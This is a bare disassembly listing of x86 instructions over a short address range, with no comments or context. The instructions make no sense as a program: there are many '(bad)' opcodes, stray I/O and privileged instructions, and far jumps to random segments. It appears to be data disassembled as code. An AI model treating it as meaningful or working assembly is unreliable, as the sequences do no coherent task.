  41beb2:	mov    al,ds:0x8ed2f7f2
  41beb7:	shl    BYTE PTR [edi+0x1b],cl
  41beba:	cwde   
  41bebb:	and    eax,0x4c38d091
  41bec0:	cmp    al,0xa8
  41bec2:	jmp    DWORD PTR [ebp+0x5b81f6d6]
  41bec8:	outs   dx,BYTE PTR ds:[esi]
  41bec9:	add    cl,0x60
  41becc:	sub    DWORD PTR [ecx],edi
  41bece:	mov    ah,0x16
  41bed0:	outs   dx,BYTE PTR ds:[esi]
  41bed1:	dec    ebx
  41bed2:	push   ebx
  41bed3:	sbb    ch,bh
  41bed5:	ret    0xfbd8
  41bed8:	xchg   ecx,eax
  41bed9:	jnp    0x41beb2
  41bedb:	jg     0x41befa
  41bedd:	mov    esp,0x8b230127
  41bee2:	cdq    
  41bee3:	leave  
  41bee4:	mov    esp,0xbcd9de63
  41bee9:	mov    ds:0x80127d20,eax
  41beee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bef0:	je     0x41becc
  41bef2:	cmp    BYTE PTR [esi-0x4a23a033],0x96
  41bef9:	inc    edx
  41befa:	mov    esp,0x706d7520
  41beff:	mov    esp,0x8260d290
  41bf04:	inc    edx
  41bf05:	cdq    
  41bf06:	jne    0x41bf85
  41bf08:	call   0x3b52f11e
  41bf0d:	pop    eax
  41bf0e:	add    al,0xf9
  41bf10:	and    bh,dh
  41bf12:	(bad)  
  41bf13:	adc    bh,BYTE PTR [ecx-0x19772d1]
  41bf19:	pop    edx
  41bf1a:	in     al,0xc0
  41bf1c:	and    al,0xa5
  41bf1e:	xor    esi,DWORD PTR [ecx]
  41bf20:	adc    DWORD PTR [edi-0x56ba9e75],ebx
  41bf26:	es pop eax
  41bf28:	push   0xa61bd92a
  41bf2d:	das    
  41bf2e:	mov    eax,0x2e38caad
  41bf33:	lea    eax,[edx-0x149287ba]
  41bf39:	xchg   edi,eax
  41bf3a:	sub    BYTE PTR [esi-0x10],cl
  41bf3d:	test   al,0x76
  41bf3f:	jmp    0xe14a3bb5
  41bf44:	or     DWORD PTR [edi-0x1f65dde4],0x27991c11
  41bf4e:	inc    DWORD PTR [ecx+0x60608b21]
  41bf54:	sbb    bh,BYTE PTR [edx+ecx*2+0x23]
  41bf58:	cli    
  41bf59:	(bad)  
  41bf5a:	pop    ecx
  41bf5b:	push   edx
  41bf5c:	xchg   BYTE PTR [ebx],cl
  41bf5e:	mov    ecx,0x4cf4c500
  41bf63:	push   edi
  41bf64:	ds jp  0x41bfc4
  41bf67:	dec    eax
  41bf68:	sbb    edi,DWORD PTR [esi-0x5751dff9]
  41bf6e:	out    dx,eax
  41bf6f:	test   BYTE PTR [ecx+0x1],bh
  41bf72:	pop    edx
  41bf73:	pop    ebx
  41bf74:	aas    
  41bf75:	cli    
  41bf76:	mov    eax,ds:0xcb146754
  41bf7b:	je     0x41bf92
  41bf7d:	push   ebp
  41bf7e:	mov    dh,0xb2
  41bf80:	ja     0x41bf3f
  41bf82:	xor    DWORD PTR [edi+0x6692bff4],ebp
  41bf88:	pop    ss
  41bf89:	jmp    0x78:0x4b887df4
  41bf90:	jecxz  0x41bf71
  41bf92:	aam    0x58
  41bf94:	inc    ecx
  41bf95:	imul   esi,DWORD PTR [edx],0xffffff9b
  41bf98:	adc    cl,BYTE PTR [eax-0x66d71d9d]
  41bf9e:	cdq    
  41bf9f:	adc    al,0xfa
  41bfa1:	jge    0x41bf73
  41bfa3:	and    BYTE PTR [esi+eiz*8],bl
  41bfa6:	lods   al,BYTE PTR ds:[esi]
  41bfa7:	fyl2x  
  41bfa9:	clc    
  41bfaa:	add    BYTE PTR [ecx+0x3dbd9a7f],dh
  41bfb0:	out    0x50,eax
  41bfb2:	dec    ebx
  41bfb3:	jecxz  0x41bf87
  41bfb5:	popa   
  41bfb6:	push   es
  41bfb7:	jp     0x41c028
  41bfb9:	mov    bl,0x1a
  41bfbb:	ss call 0xc8f0:0x66ee11f1
  41bfc3:	cmp    edi,DWORD PTR [ecx]
  41bfc5:	mov    esi,0x6a6a0076
  41bfca:	xchg   esi,eax
  41bfcb:	icebp  
  41bfcc:	sbb    al,BYTE PTR [edi]
  41bfce:	xchg   edi,eax
  41bfcf:	lods   al,BYTE PTR ds:[esi]
  41bfd0:	dec    edi
  41bfd1:	call   0xd77d91eb
  41bfd6:	rcl    eax,0x2c
  41bfd9:	ins    DWORD PTR es:[edi],dx
  41bfda:	cmp    bh,BYTE PTR [ecx+0x6286c23b]
  41bfe0:	adc    esi,DWORD PTR [eax-0x7e]
  41bfe3:	inc    esi
  41bfe4:	jmp    0x68ed:0x7aec12ce
  41bfeb:	jbe    0x41bfa2
  41bfed:	rcr    edi,1
  41bfef:	es push esi
  41bff1:	pop    ebx
  41bff2:	sub    al,dl
  41bff4:	xchg   esi,eax
  41bff5:	pusha  
  41bff6:	add    eax,0x3fb728f6
  41bffb:	sbb    DWORD PTR [ebp+0x12],esp
  41bffe:	dec    eax
  41bfff:	in     al,0x3b
  41c001:	xor    al,0x93
  41c003:	das    
  41c004:	stos   DWORD PTR es:[edi],eax
  41c005:	mov    esp,0xda29adc1
  41c00a:	or     DWORD PTR [ecx],edx
  41c00c:	out    dx,eax
  41c00d:	sub    eax,0x439d52ba
  41c012:	test   al,0x10
  41c014:	out    dx,al
  41c015:	pop    es
  41c016:	xchg   ecx,eax
  41c017:	and    bl,dh
  41c019:	xchg   ebx,eax
  41c01a:	imul   BYTE PTR [edx]
  41c01c:	into   
  41c01d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c01e:	daa    
  41c01f:	(bad)  
  41c020:	es loopne 0x41c05c
  41c023:	cmc    
  41c024:	int    0x48
  41c026:	and    BYTE PTR [eax-0x7289cf9c],ah
  41c02c:	adc    DWORD PTR [edi+0x19],0x5ddb5b0
  41c033:	pop    ecx
  41c034:	call   0xf5b0bc6f
  41c039:	mov    dl,0x33
  41c03b:	clc    
  41c03c:	std    
  41c03d:	ja     0x41c001
  41c03f:	pop    ss
  41c040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c041:	pop    edi
  41c042:	mov    ds:0x8f078e6d,al
  41c047:	call   0xa9c34c0c
  41c04c:	(bad)  
  41c04d:	adc    cl,BYTE PTR [edi]
  41c04f:	mov    esi,0xf479f67c
  41c054:	out    dx,al
  41c055:	call   0xd9cc7252
  41c05a:	inc    ebp
  41c05b:	adc    ah,BYTE PTR [ebp+0x45]
  41c05e:	jae    0x41c0ba
  41c060:	adc    BYTE PTR [ecx],bl
  41c062:	out    dx,eax
  41c063:	mov    esi,0x4919c0fb
  41c068:	jns    0x41c0b8
  41c06a:	pop    esp
  41c06b:	jmp    0xa46b:0xaddd9b50
  41c072:	stos   BYTE PTR es:[edi],al
  41c073:	int3   
  41c074:	dec    edi
  41c075:	push   0x5c75450a
  41c07a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c07b:	daa    
  41c07c:	mov    DWORD PTR [esi-0x486ca75a],esp
  41c082:	add    DWORD PTR [ebx],eax
  41c084:	cmp    esp,0x2d
  41c087:	in     al,0x5e
  41c089:	jmp    0x41c01a
  41c08b:	test   al,0x38
  41c08d:	ja     0x41c035
  41c08f:	lods   al,BYTE PTR ds:[esi]
  41c090:	fldenv [ecx+0x63]
  41c093:	mov    ebx,0x766d7d0a
  41c098:	sub    eax,0xf039ac49
  41c09d:	push   ebx
  41c09e:	aad    0x3
  41c0a0:	sbb    esp,DWORD PTR [ebx+0x6b1e04b2]
  41c0a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0a7:	mov    ah,0xaa
  41c0a9:	lods   eax,DWORD PTR ds:[si]
  41c0ab:	cdq    
  41c0ac:	mov    gs,ecx
  41c0ae:	mov    esi,0x7e1e27c7
  41c0b3:	inc    DWORD PTR [esi+0x2e]
  41c0b6:	xor    al,0xb4
  41c0b8:	lods   al,BYTE PTR ds:[esi]
  41c0b9:	push   ecx
  41c0ba:	pusha  
  41c0bb:	push   ecx
  41c0bc:	cld    
  41c0bd:	in     al,dx
  41c0be:	adc    DWORD PTR [eax-0x7610bc6],eax
  41c0c4:	es lock nop
  41c0c7:	mov    ?,WORD PTR [eax+0x3b]
  41c0ca:	nop
  41c0cb:	stos   DWORD PTR es:[edi],eax
  41c0cc:	fwait
  41c0cd:	xchg   edi,eax
  41c0ce:	cmp    al,ah
  41c0d0:	mov    esp,0x6cd71dd6
  41c0d5:	scas   al,BYTE PTR es:[edi]
  41c0d6:	mov    BYTE PTR [ecx],dl
  41c0d8:	fldenv [ecx-0x5]
  41c0db:	mov    ss,WORD PTR [edi+0x16]
  41c0de:	cli    
  41c0df:	lods   eax,DWORD PTR ds:[esi]
  41c0e0:	dec    eax
  41c0e1:	test   BYTE PTR [eax],ch
  41c0e3:	inc    ebp
  41c0e4:	xlat   BYTE PTR ds:[ebx]
  41c0e5:	and    al,ch
  41c0e7:	and    eax,0xb5989e0b
  41c0ec:	test   al,0x12
  41c0ee:	dec    esi
  41c0ef:	sub    DWORD PTR [edi+edi*8-0x7c845e82],eax
  41c0f6:	in     eax,dx
  41c0f7:	mov    edi,ebp
  41c0f9:	in     al,dx
  41c0fa:	xor    al,0x1a
  41c0fc:	push   ebx
  41c0fd:	xor    al,0x8e
  41c0ff:	outs   dx,DWORD PTR ds:[esi]
  41c100:	push   esi
  41c101:	loop   0x41c108
  41c103:	loop   0x41c183
  41c105:	div    BYTE PTR [eax-0x55]
  41c108:	ss mov edx,0x2858e1c0
  41c10e:	mov    BYTE PTR [ebp+0x28b0487f],ch
  41c114:	mov    ebp,DWORD PTR cs:[edx-0x61bdc188]
  41c11b:	ss dec ecx
  41c11d:	mov    dh,0x5f
  41c11f:	out    dx,al
  41c120:	jecxz  0x41c197
  41c122:	adc    DWORD PTR [ebp+0x4b],edi
  41c125:	sbb    edx,DWORD PTR [edx*2+0x37607032]
  41c12c:	xchg   edx,eax
  41c12d:	stos   DWORD PTR es:[edi],eax
  41c12e:	loop   0x41c162
  41c130:	popf   
  41c131:	jle    0x41c152
  41c133:	xchg   esi,eax
  41c134:	test   eax,0x3527e659
  41c139:	jecxz  0x41c0c4
  41c13b:	rcr    BYTE PTR [ebp-0x7f],cl
  41c13e:	dec    edi
  41c13f:	sbb    ecx,esi
  41c141:	out    0x15,al
  41c143:	sub    ah,BYTE PTR [esi+esi*1-0x21]
  41c147:	imul   esp,edi,0xfffffffa
  41c14a:	mov    ecx,0xafd9cb88
  41c14f:	mov    DWORD PTR [eax],ecx
  41c151:	xor    dl,ch
  41c153:	mov    esi,0x4f64fa85
  41c158:	cmp    eax,0xeaa7c3a1
  41c15d:	pop    es
  41c15e:	std    
  41c15f:	mov    bh,0x84
  41c161:	(bad)  
  41c163:	hlt    
  41c164:	push   esi
  41c165:	pop    ecx
  41c166:	ret    
  41c167:	cwde   
  41c168:	pop    esp
  41c169:	jle    0x41c12e
  41c16b:	mov    ah,0xf0
  41c16d:	jno    0x41c186
  41c16f:	cli    
  41c170:	(bad)  
  41c171:	fld    st(1)
  41c173:	test   DWORD PTR [edi+edi*4-0x1fb1db0e],edi
  41c17a:	test   BYTE PTR [edx],bh
  41c17c:	test   BYTE PTR [ecx],0xdb
  41c17f:	xchg   esi,eax
  41c180:	cs xchg edx,eax
  41c182:	sub    DWORD PTR [ebx],0x978e077b
  41c188:	push   eax
  41c189:	stos   BYTE PTR es:[edi],al
  41c18a:	adc    DWORD PTR [eax],ebp
  41c18c:	cmp    eax,0xa9afc606
  41c191:	ret    
  41c192:	jg     0x41c152
  41c194:	xchg   esi,eax
  41c195:	cdq    
  41c196:	les    edx,FWORD PTR [ebx]
  41c198:	or     ebx,DWORD PTR [ecx+0x2649da63]
  41c19e:	gs adc esp,ebx
  41c1a1:	arpl   WORD PTR [ebp+0x68f2572b],ax
  41c1a7:	inc    eax
  41c1a8:	mov    ebx,ebp
  41c1aa:	mov    ch,0x70
  41c1ac:	push   ebp
  41c1ad:	sti    
  41c1ae:	xchg   edi,eax
  41c1af:	or     cl,BYTE PTR ds:0x8c95174e
  41c1b5:	xchg   ax,ax
  41c1b7:	es push esi
  41c1b9:	pop    ss
  41c1ba:	dec    esi
  41c1bb:	push   ss
  41c1bc:	and    edx,edx
  41c1be:	pop    ds
  41c1bf:	pop    ds
  41c1c0:	sahf   
  41c1c1:	xor    DWORD PTR [ebp-0x2affd0f3],edi
  41c1c7:	xchg   DWORD PTR [eax-0x5f0b8545],esp
  41c1cd:	test   eax,0x2e242120
  41c1d2:	and    edx,DWORD PTR [esi+edi*8]
  41c1d5:	iret   
  41c1d6:	xor    eax,0x313dd531
  41c1db:	jbe    0x41c22d
  41c1dd:	mov    eax,?
  41c1df:	loope  0x41c1ee
  41c1e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1e2:	std    
  41c1e3:	cs mov bh,0x9c
  41c1e6:	mov    WORD PTR [edx-0x2c],gs
  41c1e9:	jle    0x41c23d
  41c1eb:	ins    BYTE PTR es:[edi],dx
  41c1ec:	xchg   esp,eax
  41c1ed:	cs int 0x9f
  41c1f0:	jns    0x41c20f
  41c1f2:	addr16 int3 
  41c1f4:	pop    ebp
  41c1f5:	push   eax
  41c1f6:	mov    ds:0xdb5f31cd,al
  41c1fb:	xchg   ecx,eax
  41c1fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1fd:	ror    DWORD PTR [edx+0x1e],0x18
  41c201:	cdq    
  41c202:	icebp  
  41c203:	or     al,0x4b
  41c205:	or     ah,ch
  41c207:	(bad)  
  41c208:	in     al,dx
  41c209:	scas   al,BYTE PTR es:[edi]
  41c20a:	sub    al,0xf0
  41c20c:	add    al,0x75
  41c20e:	xchg   edx,eax
  41c20f:	mov    ebp,0x179890a8
  41c214:	cs scas al,BYTE PTR es:[edi]
  41c216:	mov    edx,0x82ba93ad
  41c21b:	jge    0x41c1a7
  41c21d:	(bad)  
  41c21e:	cld    
  41c21f:	outs   dx,DWORD PTR ds:[esi]
  41c220:	cs scas eax,DWORD PTR es:[edi]
  41c222:	shl    DWORD PTR [edx-0x73],1
  41c225:	push   ecx
  41c226:	push   ecx
  41c227:	enter  0x3119,0xfa
  41c22b:	mov    bh,0x92
  41c22d:	or     eax,0x4a60a3a1
  41c232:	jo     0x41c21b
  41c234:	dec    ebx
  41c235:	jne    0x41c223
  41c237:	imul   edi,DWORD PTR [edx+0x0],0xebfe457c
  41c23e:	jl     0x41c25a
  41c240:	xchg   DWORD PTR [ebx+eiz*4+0x1f82f0e4],edx
  41c247:	cmp    edi,ebx
  41c249:	imul   ecx,ecx,0x3d
  41c24c:	out    0xa5,eax
  41c24e:	mov    esp,edi
  41c250:	pop    edi
  41c251:	out    dx,eax
  41c252:	ins    BYTE PTR es:[edi],dx
  41c253:	rcr    DWORD PTR [ecx],0x39
  41c256:	and    eax,0xf0984c64
  41c25b:	sahf   
  41c25c:	imul   edi,DWORD PTR [ebp+0x28858f26],0x49
  41c263:	std    
  41c264:	dec    ebp
  41c265:	dec    esp
  41c266:	sbb    al,0x6d
  41c268:	jne    0x41c1f9
  41c26a:	popf   
  41c26b:	xchg   BYTE PTR [edi],al
  41c26d:	add    al,0xf1
  41c26f:	or     eax,0xdcbc003a
  41c274:	repz not cl
  41c277:	lds    ecx,FWORD PTR [edi]
  41c279:	xchg   DWORD PTR [ebp+0x20],ebx
  41c27c:	(bad)  
  41c27d:	cdq    
  41c27e:	sub    eax,0x9cd711cc
  41c283:	xor    BYTE PTR [ecx+0x4c13d753],cl
  41c289:	fwait
  41c28a:	mov    BYTE PTR fs:[esi+0x45],al
  41c28e:	push   ecx
  41c28f:	mov    eax,0x96ef0d95
  41c294:	outs   dx,BYTE PTR ds:[esi]
  41c295:	xor    BYTE PTR [edx],dh
  41c297:	jbe    0x41c2bb
  41c299:	test   al,0xbe
  41c29b:	pop    ecx
  41c29c:	sbb    bh,BYTE PTR [eax-0x40c30a1]
  41c2a2:	jecxz  0x41c2ae
  41c2a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2a5:	inc    edi
  41c2a6:	add    DWORD PTR [edi],0xfbf9c11c
  41c2ac:	add    BYTE PTR [si+0x32ae],ah
  41c2b1:	scas   al,BYTE PTR es:[edi]
  41c2b2:	xor    al,0x5c
  41c2b4:	test   esp,esi
  41c2b6:	or     ebp,edx
  41c2b8:	mov    eax,es:0xdcd81fc5
  41c2be:	aas    
  41c2bf:	mov    esp,0x6d130796
  41c2c4:	in     al,dx
  41c2c5:	dec    ebp
  41c2c6:	adc    eax,0x9b996cbb
  41c2cb:	call   0x8518:0x199175b5
  41c2d2:	inc    DWORD PTR [edx]
  41c2d4:	cs enter 0x4e7a,0x3f
  41c2d9:	mov    eax,ds:0x9cc96af9
  41c2de:	pop    eax
  41c2df:	in     eax,dx
  41c2e0:	mov    eax,ds:0x755544cd
  41c2e5:	scas   eax,DWORD PTR es:[edi]
  41c2e6:	in     eax,dx
  41c2e7:	lds    ebx,FWORD PTR ds:0xd88b850d
  41c2ed:	pop    edx
  41c2ee:	(bad)  [eax]
  41c2f0:	jae    0x41c320
  41c2f2:	mov    DWORD PTR [esp+edi*4+0x59f1dc2c],ecx
  41c2f9:	outs   dx,BYTE PTR ds:[esi]
  41c2fa:	shr    BYTE PTR [ebp+0x6f],1
  41c2fd:	ja     0x41c373
  41c2ff:	or     DWORD PTR [ebx-0x5fee352c],edx
  41c305:	and    DWORD PTR [edx],esi
  41c307:	xchg   edi,eax
  41c308:	sbb    al,0x1b
  41c30a:	fstp   TBYTE PTR ds:0xfaff3f59
  41c310:	dec    edx
  41c311:	push   edx
  41c312:	(bad)  
  41c313:	xchg   ebx,eax
  41c314:	lods   eax,DWORD PTR ds:[esi]
  41c315:	fs or  al,0x71
  41c318:	ret    0xcde4
  41c31b:	dec    edx
  41c31c:	sar    dl,1
  41c31e:	div    BYTE PTR ds:0xfc8cbb9c
  41c324:	in     al,0x5c
  41c326:	cwde   
  41c327:	std    
  41c328:	mov    ds:0x860b0969,eax
  41c32d:	retf   0xf54d
  41c330:	mov    DWORD PTR [edi-0x6c],ecx
  41c333:	ja     0x41c324
  41c335:	add    cl,BYTE PTR [esi+edx*8+0x5f650eed]
  41c33c:	and    dh,BYTE PTR [esi-0x74afdbe5]
  41c342:	lds    edi,FWORD PTR [eax]
  41c344:	xor    eax,0xb922ecea
  41c349:	pushf  
  41c34a:	jns    0x41c359
  41c34c:	pusha  
  41c34d:	ds jo  0x41c2f4
  41c350:	shl    BYTE PTR [eax+0x79171ab1],0x95
  41c357:	cmp    ecx,DWORD PTR [eax-0x71]
  41c35a:	in     al,0x16
  41c35c:	int3   
  41c35d:	mov    ebp,0x6915fab1
  41c362:	inc    esp
  41c363:	mov    al,ds:0xe988630a
  41c368:	mov    ebx,0x54b79b63
  41c36d:	lea    eax,[ebx+0x47]
  41c370:	push   es
  41c371:	and    BYTE PTR [edx+0x1d],dl
  41c374:	loope  0x41c32c
  41c376:	mov    ds:0x17c2877f,al
  41c37b:	or     esp,DWORD PTR [esi+0xa]
  41c37e:	stos   BYTE PTR es:[edi],al
  41c37f:	dec    edi
  41c380:	or     al,0x27
  41c382:	mov    ecx,0x27752824
  41c387:	mov    ebp,0xc6d2e3f
  41c38c:	sbb    DWORD PTR [edi+0x92fe85f],ebp
  41c392:	popa   
  41c393:	mov    dl,0x86
  41c395:	enter  0x4c96,0x3b
  41c399:	cld    
  41c39a:	mov    al,0x89
  41c39c:	out    0x93,eax
  41c39e:	dec    ecx
  41c39f:	mov    bh,0x1b
  41c3a1:	or     dl,dh
  41c3a3:	out    dx,al
  41c3a4:	sti    
  41c3a5:	mov    edi,0x99010358
  41c3aa:	adc    esp,DWORD PTR [bp+si+0x5]
  41c3ae:	adc    esp,DWORD PTR [edx+0x6ef72c0a]
  41c3b4:	cmc    
  41c3b5:	inc    eax
  41c3b6:	add    DWORD PTR [ecx+edx*2-0x77],edi
  41c3ba:	mov    eax,0xa444447f
  41c3bf:	cld    
  41c3c0:	ja     0x41c3a0
  41c3c2:	jg     0x41c433
  41c3c4:	gs daa 
  41c3c6:	or     al,0xd2
  41c3c8:	mov    dl,0xa4
  41c3ca:	sbb    al,0x52
  41c3cc:	jmp    0x986a:0xda8cb055
  41c3d3:	jb     0x41c364
  41c3d5:	or     DWORD PTR ds:0x81ce5ee3,esp
  41c3db:	scas   eax,DWORD PTR es:[edi]
  41c3dc:	pop    DWORD PTR [ebx+0x12471525]
  41c3e2:	scas   al,BYTE PTR es:[edi]
  41c3e3:	lods   eax,DWORD PTR ds:[esi]
  41c3e4:	in     al,dx
  41c3e5:	cmp    eax,0x388fed80
  41c3ea:	mov    esp,DWORD PTR [edx-0x31461e67]
  41c3f0:	loopne 0x41c46d
  41c3f2:	dec    edx
  41c3f3:	mov    eax,0x85896cb1
  41c3f8:	int3   
  41c3f9:	imul   ecx,DWORD PTR [edx-0x69f6b738],0xd80595a6
  41c403:	mov    ch,0xd3
  41c405:	in     eax,dx
  41c406:	jno    0x41c472
  41c408:	arpl   WORD PTR [edx+edi*2],cx
  41c40b:	or     bl,BYTE PTR [edx-0x55]
  41c40e:	and    al,0xc6
  41c410:	prefetchnta BYTE PTR [eax+0x364d168a]
  41c417:	jge    0x41c3a7
  41c419:	jae    0x41c419
  41c41b:	jmp    0xc891:0x86a70f7
  41c422:	xchg   edx,eax
  41c423:	cli    
  41c424:	xchg   ebx,eax
  41c425:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c426:	mov    esi,0xe67f8a97
  41c42b:	mov    dh,0x39
  41c42d:	jmp    0x41c428
  41c42f:	stc    
  41c430:	mov    edx,0xdc405456
  41c435:	sub    ebx,esi
  41c437:	in     eax,dx
  41c438:	push   edx
  41c439:	in     eax,0xb2
  41c43b:	jmp    0x204b1a91
  41c440:	mov    DWORD PTR [esp+esi*4+0x1cf948ff],ecx
  41c447:	mov    esi,0x9e13b642
  41c44c:	es sub al,0x1a
  41c44f:	lock lods al,BYTE PTR ds:[esi]
  41c451:	push   ecx
  41c452:	jo     0x41c3f9
  41c454:	mov    bl,0x10
  41c456:	loop   0x41c4d5
  41c458:	push   edi
  41c459:	adc    al,0x5e
  41c45b:	jmp    0x7cb7:0x2c8f55b0
  41c462:	mov    cl,0xe7
  41c464:	jmp    0xdfa7:0x2a4ff27
  41c46b:	mov    eax,ds:0xe4bfa63e
  41c470:	jo     0x41c4e1
  41c472:	std    
  41c473:	push   ebp
  41c474:	inc    esi
  41c475:	outs   dx,DWORD PTR ds:[esi]
  41c476:	cmp    BYTE PTR [edx+eiz*1-0x7b501792],bh
  41c47d:	sub    dl,BYTE PTR [edx+0x47f0cd75]
  41c483:	aaa    
  41c484:	fidivr DWORD PTR [eax-0x62]
  41c487:	xor    bl,BYTE PTR fs:[ebx]
  41c48a:	or     al,0x96
  41c48c:	ds xchg ch,cl
  41c48f:	test   BYTE PTR [edx-0x162eb17c],bl
  41c495:	ds jmp 0x41c480
  41c498:	in     eax,0x10
  41c49a:	das    
  41c49b:	int3   
  41c49c:	pop    edi
  41c49d:	jge    0x41c477
  41c49f:	and    BYTE PTR [esp+ecx*1+0xdbae836],cl
  41c4a6:	cs loopne 0x41c446
  41c4a9:	sti    
  41c4aa:	cmp    BYTE PTR [edi+esi*4-0x3f],bh
  41c4ae:	pop    ecx
  41c4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4b0:	inc    esi
  41c4b1:	(bad)  
  41c4b2:	pop    edx
  41c4b3:	icebp  
  41c4b4:	iret   
  41c4b5:	call   0xbcd6373e
  41c4ba:	sub    ebp,DWORD PTR [ebx-0x21aedb5c]
  41c4c0:	add    edx,DWORD PTR [esi]
  41c4c2:	(bad)  
  41c4c4:	jbe    0x41c4a9
  41c4c6:	js     0x41c50f
  41c4c8:	(bad)  
  41c4ca:	(bad)  
  41c4cb:	sbb    edx,esp
  41c4cd:	add    BYTE PTR [eax+eax*4],bh
  41c4d0:	jp     0x41c490
  41c4d2:	adc    BYTE PTR [edx-0x68],al
  41c4d5:	cli    
  41c4d6:	pop    esi
  41c4d7:	cmp    BYTE PTR [edx+eax*1+0x6326cf81],ah
  41c4de:	mov    ah,0x11
  41c4e0:	in     eax,0xa0
  41c4e2:	sbb    ebp,DWORD PTR [ecx+0x5d]
  41c4e5:	nop
  41c4e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c4e7:	add    eax,ebx
  41c4e9:	pushf  
  41c4ea:	fnstenv [edi+0x25a18bec]
  41c4f0:	fisttp WORD PTR [ebx+0x21]
  41c4f3:	dec    ebx
  41c4f4:	jno    0x41c531
  41c4f6:	scas   eax,DWORD PTR es:[edi]
  41c4f7:	push   esp
  41c4f8:	sub    eax,0x26bac39e
  41c4fd:	scas   al,BYTE PTR es:[edi]
  41c4fe:	jle    0x41c541
  41c500:	scas   al,BYTE PTR es:[edi]
  41c501:	fild   DWORD PTR [ebp-0x11d1728e]
  41c507:	inc    ecx
  41c508:	cmp    BYTE PTR [esi+0x67],al
  41c50b:	fsubr  DWORD PTR [edi+0x5c]
  41c50e:	(bad)  
  41c50f:	xchg   edi,eax
  41c510:	hlt    
  41c511:	hlt    
  41c512:	test   BYTE PTR [edx+0x33],dh
  41c515:	rcr    DWORD PTR [edi-0x13],1
  41c518:	push   edx
  41c519:	data16 mov bh,0xd3
  41c51c:	neg    bh
  41c51e:	in     eax,0xea
  41c520:	add    al,0x29
  41c522:	inc    esp
  41c523:	sub    eax,0x44305a1d
  41c528:	shl    bl,cl
  41c52a:	(bad)  
  41c52b:	stos   BYTE PTR es:[edi],al
  41c52c:	adc    BYTE PTR [ecx+0x6b],0xc6
  41c530:	stos   DWORD PTR es:[edi],eax
  41c531:	adc    ecx,edi
  41c533:	sub    ch,BYTE PTR [esi]
  41c535:	fimul  DWORD PTR [eax+edi*8]
  41c538:	mov    al,ds:0x90b3c745
  41c53d:	rol    BYTE PTR [eax-0x7c],cl
  41c540:	jmp    0x3b8a2cd3
  41c545:	sub    ebx,ecx
  41c547:	dec    ebp
  41c548:	cmp    al,0x56
  41c54a:	mov    al,0xac
  41c54c:	xchg   edi,eax
  41c54d:	mov    ebx,0xcd5e5837
  41c552:	test   eax,0x236f75ef
  41c558:	popf   
  41c559:	mov    cl,0x1f
  41c55b:	cmp    BYTE PTR [eax+0x3d],bl
  41c55e:	sbb    dh,BYTE PTR [eax]
  41c560:	mov    WORD PTR [esi],?
  41c562:	add    al,0x10
  41c564:	cmp    eax,0xc5b5c57d
  41c569:	addr16 out dx,eax
  41c56b:	in     al,dx
  41c56c:	popa   
  41c56d:	outs   dx,DWORD PTR ds:[esi]
  41c56e:	pop    eax
  41c56f:	(bad)  
  41c570:	pop    ecx
  41c571:	sahf   
  41c572:	cwde   
  41c573:	jmp    0xef484e75
  41c578:	adc    al,0x11
  41c57a:	gs aas 
  41c57c:	push   esi
  41c57d:	leave  
  41c57e:	lods   eax,DWORD PTR ds:[esi]
  41c57f:	add    DWORD PTR [ecx+0x54],edx
  41c582:	add    bh,dl
  41c584:	ss clc 
  41c586:	xor    eax,0x28bdc1d8
  41c58b:	fnstenv [ebp-0x5a7cbc67]
  41c591:	cmp    eax,0xcb0be6f5
  41c596:	dec    eax
  41c597:	xchg   esp,eax
  41c598:	dec    ebp
  41c599:	je     0x41c5c7
  41c59b:	es mov ecx,0x60565492
  41c5a1:	push   0x7dc15630
  41c5a6:	fadd   QWORD PTR [esi]
  41c5a8:	es mov edx,0x584adb25
  41c5ae:	hlt    
  41c5af:	fadd   QWORD PTR [esi]
  41c5b1:	imul   esi,esi,0x369aefae
  41c5b7:	ficomp WORD PTR [edx-0x6d]
  41c5ba:	push   ds
  41c5bb:	pop    edi
  41c5bc:	shr    DWORD PTR [edx-0x7e7806de],1
  41c5c2:	clc    
  41c5c3:	hlt    
  41c5c4:	xor    DWORD PTR [edi+edx*2-0x4a9aab3b],edx
  41c5cb:	outs   dx,BYTE PTR ds:[esi]
  41c5cc:	push   edx
  41c5cd:	adc    ah,ah
  41c5cf:	pop    ds
  41c5d0:	adc    DWORD PTR [ebp+0x14478c0e],edi
  41c5d6:	xor    eax,0xc42de543
  41c5db:	cmp    BYTE PTR [ecx+0x4a6b8427],dh
  41c5e1:	mov    al,ds:0x13fe753f
  41c5e6:	int    0xae
  41c5e8:	pop    ebp
  41c5e9:	jl     0x41c642
  41c5eb:	iret   
  41c5ec:	mov    dh,BYTE PTR [ebx-0xa]
  41c5ef:	ds cmc 
  41c5f1:	lds    edx,FWORD PTR ds:0x643bf0a
  41c5f7:	and    ch,BYTE PTR [edi+0x7c]
  41c5fa:	sub    BYTE PTR gs:[edx-0x1d],dh
  41c5fe:	adc    ecx,DWORD PTR [esi+0x76]
  41c601:	lahf   
  41c602:	cmp    cl,0x7e
  41c605:	dec    esp
  41c606:	(bad)  
  41c607:	aam    0xc5
  41c609:	loope  0x41c650
  41c60b:	addr16 mov al,0xbe
  41c60e:	or     eax,0x8948fc14
  41c613:	mov    ds:0x202246cd,al
  41c618:	ins    DWORD PTR es:[edi],dx
  41c619:	call   0xfbb0:0x14e50d7d
  41c620:	sub    eax,0xdd4b86f0
  41c625:	cmp    BYTE PTR [ebx-0x36],ch
  41c628:	and    esp,DWORD PTR [ebp+0x0]
  41c62b:	inc    edi
  41c62c:	lods   eax,DWORD PTR ds:[esi]
  41c62d:	and    BYTE PTR [eax+ebp*1],ch
  41c630:	jne    0x41c6a3
  41c632:	loopne 0x41c636
  41c634:	xor    eax,0xeb2758f
  41c639:	sbb    eax,0xca4cde0b
  41c63e:	adc    al,0x8f
